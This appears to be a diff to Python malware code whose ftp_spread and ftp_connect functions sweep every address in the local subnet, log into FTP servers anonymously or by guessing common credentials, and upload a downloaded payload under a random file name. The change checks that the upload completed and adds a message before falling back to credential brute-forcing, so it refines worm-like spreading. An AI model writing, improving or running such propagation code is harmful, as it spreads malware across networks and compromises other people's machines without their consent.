@@ -216,7 +216,8 @@ def ftp_connect(ip, user, pwd, anonymous=False):
         else: payload_path = download_payload()
         if payload_path:
             with open(payload_path, 'rb') as f:
-                ftp.storbinary(f'STOR {random_name}', f)
+                response = ftp.storbinary(f'STOR {random_name}', f)
+                if response != "226 Transfer complete.": return False
         else: return False
         ftp.quit()
         return True
@@ -229,9 +230,8 @@ def ftp_spread(common_users, common_pass):
         for i in range(1, 255):
             ip = f'{local_ip}.{i}'
             print(f"Trying for ip: {ip} as anonymous user")
-            if ftp_connect(ip, "", "", anonymous=True): print(f"DONE Sending file as anonymous user for ip: {ip}")
-            else: 
-                print("ERROR NOT SEND")
+            if not ftp_connect(ip, "", "", anonymous=True):
+                print("ERROR NOT SEND AS ANONYMOUS. TRYING COMMON CREDENTIALS...")
                 done = False
                 for user in common_users:
                     if done: break
